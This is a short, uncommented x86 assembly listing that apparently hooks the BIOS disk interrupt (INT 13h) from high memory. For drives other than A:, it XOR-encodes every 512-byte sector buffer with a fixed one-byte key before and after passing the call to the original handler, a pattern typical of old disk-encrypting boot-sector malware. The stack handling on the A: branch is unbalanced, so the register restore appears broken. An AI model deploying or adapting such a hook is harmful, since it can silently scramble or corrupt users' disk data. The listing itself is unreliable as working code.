org	00
;seg: 9C00

Int13	proc
	jmp	Start_I13

KONEC_I13:
	cli
	pop	ds
	pop	BP
	pop	ES
	pop	DS
	pop	DI
	pop	SI
	pop	DX
	pop	CX
	pop	BX
	pop	AX
	sti
	iret

Start_I13:	
	cli
	push	AX
	push	BX
	push	CX
	push	DX
	push	SI
	push	DI
	push	DS
	push	ES
	push	BP
	push	ds
	push	cs
	pop	ds
	sti

	push	ax
	mov	byte ptr cs:[Disk_Op], ah
	mov	byte ptr cs:[Disk_A], 1
	mov	al, dl
	cmp	al,00	;A:
	je	Int_13_A
	mov	byte ptr cs:[Disk_A], 0
	pop	ax

	xor	cx, cx
	mov	cl, al
	mov	si, bx
	call	Loop_I13_Code

Int_13_A:
	cli
	pop	ds
	pop	BP
	pop	ES
	pop	DS
	pop	DI
	pop	SI
	pop	DX
	pop	CX
	pop	BX
	pop	AX
	sti

	mov	word ptr cs:[O_AX], ax
	mov	word ptr cs:[O_BX], bx

	pushf
        call    dword ptr cs:[OFS_13]

	pusha
	mov	ax, word ptr cs:[O_AX]
	mov	bx, word ptr cs:[O_BX]
	xor	cx, cx
	mov	cl, al
	mov	si, bx
	call	Loop_I13_Code
	popa

        iret
;	jmp	dword ptr cs:[ofs_13]
OFS_13	dw	?
SEG_13	dw	?
Disk_A	db	?
Disk_Op	db	?
O_AX	dw	?
O_BX	dw	?
int13	endp

EncDec	proc
	mov	cx, 512
	mov	al, byte ptr cs:[CodeVal]
EncDec_1:
	xor	es:[si], al
	inc	si
	loop	EncDec_1
	ret
CodeVal		db	0ADh
EncDec	endp

Loop_I13_Code:
;	mov	es, 
	push	cx
	call	EncDec
	pop	cx
	add	si, 512
	loop	Loop_I13_Code
	ret

